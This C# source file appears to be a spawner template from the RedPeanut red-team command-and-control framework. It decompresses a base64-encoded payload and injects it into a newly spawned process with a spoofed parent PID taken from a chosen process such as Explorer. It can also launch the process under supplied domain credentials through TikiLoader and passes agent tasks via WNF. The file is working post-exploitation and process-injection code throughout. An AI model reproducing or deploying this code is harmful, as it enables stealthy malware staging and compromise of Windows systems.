using RedPeanutAgent.Core;
using RedPeanutAgent.Execution;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using static RedPeanutAgent.Core.Natives;
using static RedPeanutAgent.Execution.WnfHelper;

class RedPeanutSpawn
{
    static private string nutclr = "#NUTCLR#";
    static private string task = "#TASK#";
    static private string shellcode = "#SHELLCODE#";
    static private string spawn = "#SPAWN#";
    static private string username = "#USERNAME#";
    static private string password = "#PASSWORD#";
    static private string domain = "#DOMAIN#";
    static private string process = "#PROCESS#";

    public static void Execute(string[] args)
    {
        try
        {
            bool result = false;
            string binarypath = spawn;
            if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
            {
                int ppid = FindProcessPid(process);

                if (ppid == 0)
                {
                    Console.WriteLine("[x] Couldn't get Explorer PID");
                    return;
                }
                //Spawn
                if (string.IsNullOrEmpty(shellcode))
                {
                    //Agent
                    Console.WriteLine("[*] Spawn Agent");
                    WriteWnF(task);
                    result = Spawn(binarypath, nutclr, ppid);
                }
                else
                {
                    //Shellcode
                    Console.WriteLine("[*] Spawn Shellcode");
                    result = Spawn(binarypath, shellcode, FindProcessPid(process));
                }
            }
            else
            {
                //SpawnAs
                if (string.IsNullOrEmpty(shellcode))
                {
                    //Agent
                    Console.WriteLine("[*] SpawnAs Agent");
                    WriteWnF(task);
                    result = SpawnAs(binarypath, nutclr, domain, username, password);
                }
                else
                {
                    //Shellcode
                    Console.WriteLine("[*] SpawnAs Shellcode");
                    result = SpawnAs(binarypath, shellcode, domain, username, password);
                }
            }
            Console.WriteLine("[*] Process created " + result);
        }
        catch (Exception)
        {
            Console.WriteLine("[*] Error creating process");
        }
    }

    public static bool Spawn(string binary, string shellcode, int ppid)
    {

        //Inject CLR and run stager
        byte[] payload = DecompressDLL(Convert.FromBase64String(shellcode));

        try
        {
            InjectionHelper.SapwnAndInjectPPID(binary, payload, ppid);
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
            return false;
        }
        return true;
    }

    public static bool SpawnAs(string binary, string shellcode, string domain, string username, string password)
    {

        //Inject CLR and run stager
        byte[] payload = DecompressDLL(Convert.FromBase64String(shellcode));

        try
        {
            var ldr = new TikiLoader.Loader();
            if (string.IsNullOrEmpty(domain))
                domain = ".";

            ldr.LoadAs(binary, payload, domain, username, password);

        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
            return false;
        }
        return true;
    }

    private static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }

    private static int FindProcessPid(string process)
    {
        int pid = 0;
        int session = Process.GetCurrentProcess().SessionId;
        Process[] processes = Process.GetProcessesByName(process);

        foreach (Process proc in processes)
        {
            if (proc.SessionId == session)
            {
                pid = proc.Id;
            }
        }

        return pid;

    }
}

